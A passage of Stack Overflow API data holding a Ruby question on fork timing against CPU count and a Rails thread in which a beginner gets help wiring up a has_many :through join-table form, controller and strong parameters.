"https://www.gravatar.com/avatar/e9e9a74322f5366b889d834c73afef73?s=128&d=identicon&r=PG&f=1", "display_name": "jacksonecac", "link": "https://stackoverflow.com/users/6788679/jacksonecac"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 195, "favorite_count": 0, "accepted_answer_id": 47538890, "answer_count": 1, "score": 0, "last_activity_date": 1511895386, "creation_date": 1511892991, "last_edit_date": 1511893358, "question_id": 47538354, "link": "https://stackoverflow.com/questions/47538354/ruby-multithreading-timing-versus-cpu-core-count", "title": "Ruby Multithreading timing versus cpu core count", "body": "<p>I wrote the following code to test single versus multi threading in Ruby. I loop an array of two elements and sleep for 1 second sequentially ( ~ 2 second execution time). I then do the same thing but fork the process each time ( ~ 1 second execution time since the two sleep command are running in parallel ). This made sense to me. </p>\n\n<p>As I increased the size of the array, i.e. more iterations, I noticed that the multi-threading always returned in ~ 1 second. I am running on an Ubuntu instance on VirtualBox and have 1 processing unit available to me:</p>\n\n<pre><code>root@vbox-docker:~/docker-projects/hello-world/lib# nproc\n1\n</code></pre>\n\n<p>My assumption was that as I increased the number of iterations, the multi-threading would take longer as all the processing units were consumed. The only other thing I can think of is the clock speed is pushing many of these threads through simultaneously and I need to increase the iterations even more in order to see a slow down on the multi-threaded side.</p>\n\n<p>My question is this: Am I thinking about this correctly? Does my logic make sense? Is this an accurate test to see the of results of single versus multi-threaded application?</p>\n\n<p>Check out the below Ruby script, and run if you so choose and please provide feedback.</p>\n\n<p>thanks in advance!</p>\n\n<p><strong>Edit: Setting the iteration to 500 and the sleep to 5 seconds caused the multi-threaded section to take 22 seconds and change. Interesting.</strong></p>\n\n<pre><code>#!/usr/bin/ruby\n\n#Do a single threaded run, timing each iteration of the array [0,1], doing two iterations because of two elements\nbefore = Time.now\n[0,1].each do |i|\n  sleep 1\nend\nafter = Time.now\ndelta = (after - before) * 1000.0\nputs \"Single-threaded: #{delta} milliseconds\" #Should be 1000 miliseconds X number of elements in the array (2)\n\n#Do a multi threaded run, timing each iterationg of the array [0,1], doing two iterations because of the two elements\nbefore = Time.now\n[0,1].each do |i|\n  fork do #Instead of running each operation sequentially, run each process in a different thread\n    sleep 1\n  end\nend\nProcess.waitall\nafter = Time.now\ndelta = (after - before) * 1000.0\nputs \"Multi-threaded: #{delta} milliseconds\" #Should be 1000 miliseconds X 1 while array length &lt; CPU Core count\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "has-many-through"], "comments": [{"owner": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "edited": false, "score": 1, "creation_date": 1511890224, "post_id": 47537486, "comment_id": 82031957, "body": "your form_for url seems incorrect <code>&lt;%= form_for @user,:url=&gt; productplan_index_path  </code>, it should be the create action not the index action"}, {"owner": {"reputation": 678, "user_id": 3987384, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/HudSD.jpg?s=128&g=1", "display_name": "Matias Seguel", "link": "https://stackoverflow.com/users/3987384/matias-seguel"}, "edited": false, "score": 1, "creation_date": 1511890460, "post_id": 47537486, "comment_id": 82032120, "body": "Why your ProductPlanController has methods for User resource. It should be a controller for ProductPlan. It make no sense to me"}, {"owner": {"reputation": 18856, "user_id": 1359650, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/dffc4318ac93e728a26c8e8b51b4eb37?s=128&d=identicon&r=PG", "display_name": "jvillian", "link": "https://stackoverflow.com/users/1359650/jvillian"}, "edited": false, "score": 0, "creation_date": 1511890789, "post_id": 47537486, "comment_id": 82032327, "body": "I fear this code is too broken to fix."}, {"owner": {"reputation": 31, "user_id": 9020988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/75072e5ad9c336cd167719d88dd43358?s=128&d=identicon&r=PG&f=1", "display_name": "Reynold Dmello", "link": "https://stackoverflow.com/users/9020988/reynold-dmello"}, "reply_to_user": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "edited": false, "score": 0, "creation_date": 1511891401, "post_id": 47537486, "comment_id": 82032687, "body": "@xeon131 I use the index path because by running rake routes i get productplan_index GET    /productplan(.:format)                 productplan#index                          POST   /productplan(.:format)                 productplan#create"}, {"owner": {"reputation": 31, "user_id": 9020988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/75072e5ad9c336cd167719d88dd43358?s=128&d=identicon&r=PG&f=1", "display_name": "Reynold Dmello", "link": "https://stackoverflow.com/users/9020988/reynold-dmello"}, "reply_to_user": {"reputation": 678, "user_id": 3987384, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/HudSD.jpg?s=128&g=1", "display_name": "Matias Seguel", "link": "https://stackoverflow.com/users/3987384/matias-seguel"}, "edited": false, "score": 0, "creation_date": 1511891672, "post_id": 47537486, "comment_id": 82032819, "body": "@MatiasSeguel Hi !! Are you suggesting to create a separate controller for user??"}, {"owner": {"reputation": 31, "user_id": 9020988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/75072e5ad9c336cd167719d88dd43358?s=128&d=identicon&r=PG&f=1", "display_name": "Reynold Dmello", "link": "https://stackoverflow.com/users/9020988/reynold-dmello"}, "reply_to_user": {"reputation": 18856, "user_id": 1359650, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/dffc4318ac93e728a26c8e8b51b4eb37?s=128&d=identicon&r=PG", "display_name": "jvillian", "link": "https://stackoverflow.com/users/1359650/jvillian"}, "edited": false, "score": 0, "creation_date": 1511891754, "post_id": 47537486, "comment_id": 82032867, "body": "@jvillian Thats right , I need to fix it right away or any way I can start from new"}, {"owner": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "edited": false, "score": 0, "creation_date": 1511892357, "post_id": 47537486, "comment_id": 82033195, "body": "I don&#39;t think it&#39;s too bad for a beginner. can you add your rake routes output in your questio?. I cannot understand it in the comments."}, {"owner": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "reply_to_user": {"reputation": 18856, "user_id": 1359650, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/dffc4318ac93e728a26c8e8b51b4eb37?s=128&d=identicon&r=PG", "display_name": "jvillian", "link": "https://stackoverflow.com/users/1359650/jvillian"}, "edited": false, "score": 0, "creation_date": 1511892536, "post_id": 47537486, "comment_id": 82033316, "body": "As @jvillian has pointed out ProductPlanController is doing the work of your UsersController. please refactor, after figuring out this issue."}, {"owner": {"reputation": 31, "user_id": 9020988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/75072e5ad9c336cd167719d88dd43358?s=128&d=identicon&r=PG&f=1", "display_name": "Reynold Dmello", "link": "https://stackoverflow.com/users/9020988/reynold-dmello"}, "reply_to_user": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "edited": false, "score": 0, "creation_date": 1511893251, "post_id": 47537486, "comment_id": 82033690, "body": "@xeon131 As you mentioned I have updated my post and added a list of routes , and sure I will take a look at the controller and add a UserController as well and try it."}, {"owner": {"reputation": 18856, "user_id": 1359650, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/dffc4318ac93e728a26c8e8b51b4eb37?s=128&d=identicon&r=PG", "display_name": "jvillian", "link": "https://stackoverflow.com/users/1359650/jvillian"}, "edited": false, "score": 0, "creation_date": 1511893459, "post_id": 47537486, "comment_id": 82033802, "body": "Which controller action renders <code>productplan&#47;_form.html.erb</code>?"}, {"owner": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "reply_to_user": {"reputation": 18856, "user_id": 1359650, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/dffc4318ac93e728a26c8e8b51b4eb37?s=128&d=identicon&r=PG", "display_name": "jvillian", "link": "https://stackoverflow.com/users/1359650/jvillian"}, "edited": false, "score": 0, "creation_date": 1511893519, "post_id": 47537486, "comment_id": 82033820, "body": "@jvillian it should be  <code>new_productplan GET    &#47;productplan&#47;new(.:format)             productplan#new</code>"}, {"owner": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "edited": false, "score": 0, "creation_date": 1511893642, "post_id": 47537486, "comment_id": 82033874, "body": "Can you change your form url to <code>new_productplan_path</code> and try if it works"}, {"owner": {"reputation": 31, "user_id": 9020988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/75072e5ad9c336cd167719d88dd43358?s=128&d=identicon&r=PG&f=1", "display_name": "Reynold Dmello", "link": "https://stackoverflow.com/users/9020988/reynold-dmello"}, "reply_to_user": {"reputation": 18856, "user_id": 1359650, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/dffc4318ac93e728a26c8e8b51b4eb37?s=128&d=identicon&r=PG", "display_name": "jvillian", "link": "https://stackoverflow.com/users/1359650/jvillian"}, "edited": false, "score": 0, "creation_date": 1511894013, "post_id": 47537486, "comment_id": 82034062, "body": "@jvillian the new action renders the partial form , but I tried replacing my url with new_productplan_path and after clicking the submit button, it gave me a routing error &quot;No route matches [POST] &quot;/productplan/new&quot; ."}, {"owner": {"reputation": 31, "user_id": 9020988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/75072e5ad9c336cd167719d88dd43358?s=128&d=identicon&r=PG&f=1", "display_name": "Reynold Dmello", "link": "https://stackoverflow.com/users/9020988/reynold-dmello"}, "reply_to_user": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "edited": false, "score": 0, "creation_date": 1511894083, "post_id": 47537486, "comment_id": 82034096, "body": "@xeon131 the new action renders the partial form , but I tried replacing my url with new_productplan_path and after clicking the submit button, it gave me a routing error &quot;No route matches [POST] &quot;/productplan/new&quot; ."}, {"owner": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "edited": false, "score": 0, "creation_date": 1511894304, "post_id": 47537486, "comment_id": 82034199, "body": "oops, sorry. It should be <code>productplan_path</code>. (Its 1 am here and I am feeling sleepy)"}, {"owner": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "edited": false, "score": 0, "creation_date": 1511894379, "post_id": 47537486, "comment_id": 82034224, "body": "please remove the <code>new</code> action from your controller. It is not being used anywhere and it is doing nothing."}, {"owner": {"reputation": 31, "user_id": 9020988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/75072e5ad9c336cd167719d88dd43358?s=128&d=identicon&r=PG&f=1", "display_name": "Reynold Dmello", "link": "https://stackoverflow.com/users/9020988/reynold-dmello"}, "reply_to_user": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "edited": false, "score": 0, "creation_date": 1511895016, "post_id": 47537486, "comment_id": 82034574, "body": "@xeon131 if I remove the new action controller , it gives an  Argument error saying  &quot;First argument in form cannot contain nil or be empty&quot;, also if i remove the &quot;url&quot; code it asks for a path to provide."}, {"owner": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "edited": false, "score": 0, "creation_date": 1511895299, "post_id": 47537486, "comment_id": 82034736, "body": "sorry, I am giving bad advice now. please keep that action. it is rendering your form apparently  .I will look into this tomorrow if it&#39;s still unresolved."}], "answers": [{"comments": [{"owner": {"reputation": 31, "user_id": 9020988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/75072e5ad9c336cd167719d88dd43358?s=128&d=identicon&r=PG&f=1", "display_name": "Reynold Dmello", "link": "https://stackoverflow.com/users/9020988/reynold-dmello"}, "edited": false, "score": 0, "creation_date": 1511896029, "post_id": 47538950, "comment_id": 82035134, "body": "Hi, Thanks so much for the post , I will definitely try this , also FYI , I have naming errors because I have edited from my original code as the namings are complicated and I didnt want to confuse anyone, for example ProductPlan is actually Productsku in my original code.but thanks so much I will try this and get back to you.CHeers."}, {"owner": {"reputation": 31, "user_id": 9020988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/75072e5ad9c336cd167719d88dd43358?s=128&d=identicon&r=PG&f=1", "display_name": "Reynold Dmello", "link": "https://stackoverflow.com/users/9020988/reynold-dmello"}, "edited": false, "score": 1, "creation_date": 1511902006, "post_id": 47538950, "comment_id": 82038366, "body": "Ok so I did what you told to,created a new controller and cleaned the code as much as possible but still there is no insertion of data in the join table. I will posting the new code soon"}, {"owner": {"reputation": 31, "user_id": 9020988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/75072e5ad9c336cd167719d88dd43358?s=128&d=identicon&r=PG&f=1", "display_name": "Reynold Dmello", "link": "https://stackoverflow.com/users/9020988/reynold-dmello"}, "edited": false, "score": 0, "creation_date": 1511904127, "post_id": 47538950, "comment_id": 82039456, "body": "I updated the post with your code in it please do take a look. Thanks."}, {"owner": {"reputation": 18856, "user_id": 1359650, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/dffc4318ac93e728a26c8e8b51b4eb37?s=128&d=identicon&r=PG", "display_name": "jvillian", "link": "https://stackoverflow.com/users/1359650/jvillian"}, "reply_to_user": {"reputation": 31, "user_id": 9020988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/75072e5ad9c336cd167719d88dd43358?s=128&d=identicon&r=PG&f=1", "display_name": "Reynold Dmello", "link": "https://stackoverflow.com/users/9020988/reynold-dmello"}, "edited": false, "score": 0, "creation_date": 1511905719, "post_id": 47538950, "comment_id": 82040159, "body": "I updated the answer (with new stuff at the top). I think you&#39;re quite close."}, {"owner": {"reputation": 31, "user_id": 9020988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/75072e5ad9c336cd167719d88dd43358?s=128&d=identicon&r=PG&f=1", "display_name": "Reynold Dmello", "link": "https://stackoverflow.com/users/9020988/reynold-dmello"}, "edited": false, "score": 0, "creation_date": 1511907196, "post_id": 47538950, "comment_id": 82040776, "body": "OHHH DAMNNN...Thanks so much , that was very helpful , I could finally get it working. The data stores successfully in table.You sir deserve a salute, saved me a hell of  a headache... :-) Thanks again.Cheers."}, {"owner": {"reputation": 18856, "user_id": 1359650, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/dffc4318ac93e728a26c8e8b51b4eb37?s=128&d=identicon&r=PG", "display_name": "jvillian", "link": "https://stackoverflow.com/users/1359650/jvillian"}, "reply_to_user": {"reputation": 31, "user_id": 9020988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/75072e5ad9c336cd167719d88dd43358?s=128&d=identicon&r=PG&f=1", "display_name": "Reynold Dmello", "link": "https://stackoverflow.com/users/9020988/reynold-dmello"}, "edited": false, "score": 0, "creation_date": 1511907613, "post_id": 47538950, "comment_id": 82040953, "body": "Fantastic! Now, promise me, you&#39;ll clean up your naming! ;-)"}, {"owner": {"reputation": 31, "user_id": 9020988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/75072e5ad9c336cd167719d88dd43358?s=128&d=identicon&r=PG&f=1", "display_name": "Reynold Dmello", "link": "https://stackoverflow.com/users/9020988/reynold-dmello"}, "edited": false, "score": 0, "creation_date": 1511909990, "post_id": 47538950, "comment_id": 82041842, "body": "Ya sure , definitely :-D"}], "tags": [], "owner": {"reputation": 18856, "user_id": 1359650, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/dffc4318ac93e728a26c8e8b51b4eb37?s=128&d=identicon&r=PG", "display_name": "jvillian", "link": "https://stackoverflow.com/users/1359650/jvillian"}, "is_accepted": true, "score": 1, "last_activity_date": 1511905690, "last_edit_date": 1511905690, "creation_date": 1511895304, "answer_id": 47538950, "question_id": 47537486, "link": "https://stackoverflow.com/questions/47537486/how-to-create-controller-and-views-for-has-many-and-through-relationship-in-ruby/47538950#47538950", "title": "How to create controller and views for has_many and through relationship in ruby on rails", "body": "<p>UPDATE: AFTER CODE MODIFICATIONS FROM OP</p>\n\n<p>Much closer!</p>\n\n<p>As you can see here:</p>\n\n<pre><code>Productplan Load (0.7ms)  SELECT \"productplans\".* FROM \"productplans\" WHERE \"productplans\".\"id\" = $1  [[\"id\", nil]]\n</code></pre>\n\n<p>we didn't get <code>productplan_ids</code> quite right (as indicated by <code>nil</code>). If, in console, you do:</p>\n\n<pre><code>&gt; params = ActionController::Parameters.new(up: {productplan_ids: [\"\",\"4\"]})\n&gt; params.require(:up).permit(productplan_ids: [])\n =&gt; {\"productplan_ids\"=&gt;[\"\", \"4\"]}\n</code></pre>\n\n<p>you can see that the <code>productplan_ids</code> method is returning a <code>hash</code> (well, not exactly, but close enough for now). But, you want the value for the <code>:productplan_ids</code> key. So, try:</p>\n\n<pre><code>def productplan_ids\n  params.require(:up)[:productplan_ids]\nend\n</code></pre>\n\n<p>Which should give you:</p>\n\n<pre><code>&gt; params.require(:up)[:productplan_ids]\n =&gt; [\"\", \"4\"]\n</code></pre>\n\n<p>the <code>array</code> you're looking for.</p>\n\n<p>ORIGINAL ANSWER</p>\n\n<p>I'm going to take a swing at this, but it's going to be tough.</p>\n\n<p>Okay, let's assume:</p>\n\n<ul>\n<li>You have a logged in user that is available through <code>current_user</code> in your <code>create</code> action (it looks like you're using Devise?)</li>\n<li>You have already created your <code>ProductPlans</code></li>\n<li>In <code>routes.rb</code>, you have <code>resources :user_products</code> (not <code>userproducts</code>, see note later on...)</li>\n</ul>\n\n<p>Your <code>form_for</code> should look like:</p>\n\n<pre><code>&lt;%= form_for :user_product, user_products_path do |f| %&gt;\n  &lt;%= f.collection_check_boxes :product_plan_ids, ProductPlan.all, :id, :product_plan_name %&gt;\n  &lt;%= f.submit %&gt;\n&lt;% end %&gt;\n</code></pre>\n\n<p>Note: You can use the symbol <code>:user_product</code> instead of the instance variable <code>@user</code> because you're not basing any form fields on <code>@user</code>.</p>\n\n<p>Note: A form automatically does a <code>post</code>, so you don't need to specify <code>method</code>.</p>\n\n<p>Then, <code>UserProductsController</code> (not <code>ProductPlanController</code> since you're creating one or more <code>user_products</code> not <code>product_plans</code>) should look something like:</p>\n\n<pre><code>class UserProductsController &lt; ApplicationController\n\n  def create\n    current_user.product_plans &lt;&lt; ProductPlan.where(id: product_plan_ids)\n    render action: some_success_condition ? 'index' : 'new'\n  end\n\n  private\n\n  def product_plan_ids\n    params.require(:user_product).permit(product_plan_ids: [])\n  end\n\nend\n</code></pre>\n\n<p>Note: You probably don't need a <code>new</code> action because you don't really need to instantiate anything (at least not based on anything you've shown). </p>\n\n<p>Note: You'll need to sort out what <code>some_success_condition</code> is. But it's certainly not <code>@user.save</code>. Because you're creating <code>user_products</code>, not a <code>user</code>.</p>\n\n<p>ALSO, You say: </p>\n\n<pre><code>params.require(:user).permit(:productplan_ids =&gt; [])\n</code></pre>\n\n<p>But your params are: </p>\n\n<pre><code>{\n  ...,\n  \"user\"=&gt; {\n    \"productsku_ids\"=&gt;[\"\", \"4\", \"7\"]\n  }, \n  \"commit\"=&gt;\"Create User\"\n}\n</code></pre>\n\n<p>You permit <code>productplan_ids</code> (should be <code>product_plan_ids</code>), but have <code>productsku_ids</code> (should be <code>product_sku_ids</code>) in your params. </p>\n\n<p>Some other things:</p>\n\n<p>You should read through the <a href=\"https://github.com/bbatsov/ruby-style-guide\" rel=\"nofollow noreferrer\">ruby style guide</a> to get your naming correct.</p>\n\n<p>Class names should be CamelCase. So, <code>ProductPlan</code>, not <code>Productplan</code>.</p>\n\n<p>Symbols and variables should be SnakeCase. So, :user_products, not :userproducts.</p>\n\n<p>Controller names should be plural, not singular, if they are resource-oriented. So, <code>ProductPlansController</code>, not <code>ProductPlanController</code>. (I assume you have all the usual RESTful actions for <code>ProductPlan</code>, like <code>new</code>, <code>create</code>, <code>edit</code>, <code>update</code>, etc.)</p>\n\n<p>AND, it's more conventional these days to do <code>through: :user_products</code> than <code>:through =&gt; :user_products</code>.</p>\n\n<p>So:</p>\n\n<pre><code>class User &lt; ActiveRecord::Base\n  has_many :user_products\n  has_many :product_plans, through: :user_products\nend\n\nclass ProductPlan &lt; ApplicationRecord\n  has_many :user_products\n  has_many :users, through: :user_products\nend\n\nclass UserProduct &lt; ApplicationRecord\n  belongs_to :user\n  belongs_to :product_plan\nend\n</code></pre>\n\n<p>Also, you have a bunch of mis-matched <code>def ... end</code> statements:</p>\n\n<pre><code>class ProductPlanController &lt; ApplicationController\n  before_action :authenticate_user!\n\n  def new \n      @user=User.new\n    end  \n  end # &lt;= extra 'end' here\n\n  def create\n    @user = User.create(user_params)\n    if @user.save\n      render :action =&gt; 'index'\n    else\n      render :action =&gt;'new'\n    end\n  # &lt;= missing 'end' here\n\n  private \n\n  def user_params\n    params.require(:user).permit(:productplan_ids =&gt; [])\n  end\n\nend\n</code></pre>\n\n<p>I assume that's some sort of copy-paste error</p>\n\n<p>I have no idea why you're doing:</p>\n\n<pre><code>def create\n  @user = User.create(user_params)\n  if @user.save\n    render :action =&gt; 'index'\n  else\n    render :action =&gt;'new'\n  end\nend\n</code></pre>\n\n<p>In your <code>ProductPlansController</code>. It's <code>ProductPlansController</code>. It should create a <code>ProductPlan</code>, not a <code>User</code>.</p>\n"}], "owner": {"reputation": 31, "user_id": 9020988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/75072e5ad9c336cd167719d88dd43358?s=128&d=identicon&r=PG&f=1", "display_name": "Reynold Dmello", "link": "https://stackoverflow.com/users/9020988/reynold-dmello"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1007, "favorite_count": 0, "accepted_answer_id": 47538950, "answer_count": 1, "score": 0, "last_activity_date": 1511905690, "creation_date": 1511889835, "last_edit_date": 1511904085, "question_id": 47537486, "link": "https://stackoverflow.com/questions/47537486/how-to-create-controller-and-views-for-has-many-and-through-relationship-in-ruby", "title": "How to create controller and views for has_many and through relationship in ruby on rails", "body": "<p>please go easy on me as I'm just a beginner, I am breaking my head on this issue for the past 2 days now. To summarize, I have a user and productplan , when a user selects a certain product plan(radiobutton or checkbox) , I want the current user id and selected product id to be stored in the join table called userproducts \nBut for some reason I could not store the data , I have no clue where I am going wrong, any help appreciated, thanks.</p>\n\n<p>Models:</p>\n\n<pre><code>class User &lt; ActiveRecord::Base\n  has_many :userproducts\n  has_many :productplans, :through=&gt;:userproducts\nend\n\nclass productplan &lt; ApplicationRecord\n  has_many :userproducts\n  has_many :users, :through =&gt; :userproducts\nend\n\nclass Userproduct &lt; ApplicationRecord\n  belongs_to :user\n  belongs_to :productplan\nend\n</code></pre>\n\n<p>ProductPlan Controllers:</p>\n\n<pre><code>class ProductPlanController &lt; ApplicationController\nbefore_action :authenticate_user!\ndef new \n    @user=User.new\n  end  \nend\n\ndef create\n  @user = User.create(user_params)\n  if @user.save\n    render :action =&gt; 'index'\n  else\n    render :action =&gt;'new'\n  end\nprivate \ndef user_params\n  params.require(:user).permit(:productplan_ids =&gt; [])\nend\nend\n</code></pre>\n\n<p>Views:\nproductplan/_form.html.erb</p>\n\n<pre><code>&lt;%= form_for @user,:url=&gt; productplan_index_path,:method =&gt; :post do \n|f|%&gt;\n&lt;%= f.collection_check_boxes :productplan_ids, ProductPlan.all, :id, \n:productplan_name %&gt;\n&lt;%= f.submit %&gt;\n&lt;% end %&gt;\n</code></pre>\n\n<p>Since there are less examples on the controller and views regarding has_many through I am pretty sure I have many mistakes in it. Also when I try submitting the form I get this log:</p>\n\n<pre><code>enterStarted POST \"/Productplan\" for 127.0.0.1 at 2017-11-28 11:08:29 -0600\nProcessing by ProductPlanController#create as HTML\nParameters \n{\"utf8\"=&gt;\"\u2713\",\"authenticity_token\"=&gt;\n\"mi9RwHCLPKItXai67t5iX0RYrDoE6TN9T\niZzJFYELbKVDlHbhpeNmOC0q2gu1iXyWNaUqGSEsPrBEjcUSE2yYw==\", \"user\"= &gt;\n{\"productsku_ids\"=&gt;[\"\", \"4\", \"7\"]}, \"commit\"=&gt;\"Create User\"}\nUser Load (1.0ms)  SELECT  \"users\".* FROM \"users\" WHERE \"users\".\"id\" = $1 \nORDER BY \"users\".\"id\" ASC LIMIT $2  [[\"id\", 3], [\"LIMIT\", 1]]\nProductPlan Load (2.6ms)  SELECT \"productplans\".* FROM \"productplans\" WHERE \n\"productplans\".\"id\" IN (4, 7)\n(0.5ms)  BEGIN\nProvider Load (0.5ms)  SELECT  \"providers\".* FROM \"providers\" WHERE \n\"providers\".\"id\" = $1 LIMIT $2  [[\"id\", 1], [\"LIMIT\", 1]]\nCACHE Provider Load (0.0ms)  SELECT  \"providers\".* FROM \"providers\" WHERE \n\"providers\".\"id\" = $1 LIMIT $2  [[\"id\", 1], [\"LIMIT\", 1]]\n(0.6ms)  ROLLBACK\nRendering ups/new.html.erb within layouts/application\nProductPlan Load (0.9ms)  SELECT \"productplans\".* FROM \"productplans\"\nRendered productplans/_form.html.erb (4.6ms)\nRendered productplans/new.html.erb within layouts/application (6.4ms)\nRendered _navbar.html.erb (0.7ms)\nCompleted 200 OK in 191ms (Views: 102.1ms | ActiveRecord: 14.6ms) here\n</code></pre>\n\n<p>For some reason it rollbacks,also I need to get the current user too.</p>\n\n<pre><code>dependent_new GET    /dependent/new(.:format)              dependent#new\n    dependent_create GET    /dependent/create(.:format)           dependent#create\n        summary_root GET    /summary/index(.:format)              summary#index\n          home_plans GET    /home/plans(.:format)                 home#plans\n              thanks GET    /thanks(.:format)                     charges#thanks\n  authenticated_root GET    /                                     home#roothome\n    productplan_index GET    /productplan(.:format)                 productplan#index\n                     POST   /productplan(.:format)                 productplan#create\n      new_productplan GET    /productplan/new(.:format)             productplan#new\n     edit_productplan GET    /productplan/:id/edit(.:format)        productplan#edit\n          productplan GET    /productplan/:id(.:format)             productplan#show\n                     PATCH  /productplan/:id(.:format)             productplan#update\n                     PUT    /productplan/:id(.:format)             productplan#update\n                     DELETE /productplan/:id(.:format)             productplan#destroy\n        userproducts GET    /userproducts(.:format)               userproducts#index\n                     POST   /userproducts(.:format)               userproducts#create\n     new_userproduct GET    /userproducts/new(.:format)           userproducts#new\n    edit_userproduct GET    /userproducts/:id/edit(.:format)      userproducts#edit\n         userproduct GET    /userproducts/:id(.:format)           userproducts#show\n                     PATCH  /userproducts/:id(.:format)           userproducts#update\n                     PUT    /userproducts/:id(.:format)           userproducts#update\n                     DELETE /userproducts/:id(.:format)           userproducts#destroy\n                 ups POST   /ups(.:format)                        ups#create\n              new_up GET    /ups/new(.:format)                    ups#new\n                root GET    /                                     home#index\n    new_user_session GET    /users/sign_in(.:format)              devise/sessions#new\n        user_session POST   /users/sign_in(.:format)              devise/sessions#create\ndestroy_user_session DELETE /users/sign_out(.:format)             devise/sessions#destroy\n   new_user_password GET    /users/password/new(.:format)         devise/passwords#new\n  edit_user_password GET    /users/password/edit(.:format)        devise/passwords#edit\n       user_password PATCH  /users/password(.:format)             devise/passwords#update\n                     PUT    /users/password(.:format)             devise/passwords#update\n                     POST   /users/password(.:format)             devise/passwords#create\n</code></pre>\n\n<p>SO I modified my as per @jvillian told to ,but the problem still persists,here is my new code.\nPlease note I renamed user products to ups,</p>\n\n<p>Model:</p>\n\n<pre><code>class User &lt; ActiveRecord::Base\n has_many :ups\n has_many :productplans, through: :ups\nend\n\nclass productplan &lt; ApplicationRecord\n has_many :ups\n has_many :users, :through =&gt; :ups\nend\n\nclass Up &lt; ApplicationRecord\n belongs_to :user\n belongs_to :productplan\nend\n</code></pre>\n\n<p>Ups Controller:</p>\n\n<pre><code>class UpsController &lt; ApplicationController\nbefore_action :authenticate_user!\n\ndef create\n current_user.productplans&lt;&lt;Productplan.where(id: productplans_ids)\n render :action =&gt; 'index'\nend\n\nprivate\n\ndef productplan_ids\n params.require(:up).permit(productplan_ids:[])\nend\nend\n</code></pre>\n\n<p>Views ups/_form.html.erb</p>\n\n<pre><code>&lt;%= 